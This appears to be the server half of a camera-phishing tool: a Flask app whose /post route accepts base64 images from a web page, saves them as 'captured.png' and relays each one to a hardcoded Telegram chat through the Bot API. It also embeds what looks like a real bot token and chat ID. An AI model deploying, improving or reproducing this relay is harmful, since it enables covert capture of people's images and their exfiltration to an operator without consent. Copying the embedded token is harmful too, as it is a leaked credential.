from flask import Flask, render_template, request, jsonify
import base64
import requests
import os

app = Flask(__name__)

# --- Configuration ---
BOT_TOKEN = "8812001781:AAG4L9o-ZqTEbGBBZySY9hPercAC9SRgJzI" 
CHAT_ID = "7965036892" 
# -----------------------

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/post', methods=['POST'])
def post():
    data = request.get_json()
    if 'image' in data:
        img_data = data['image'].split(",")[1]
        file_path = "captured.png"
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(img_data))
        
        # Telegram Bot ဆီ ပုံလှမ်းပို့ခြင်း
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        try:
            with open(file_path, 'rb') as photo:
                requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo})
            print("Successfully sent to Telegram!")
        except Exception as e:
            print(f"Error sending to Telegram: {e}")
            
    return jsonify({"status": "success"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
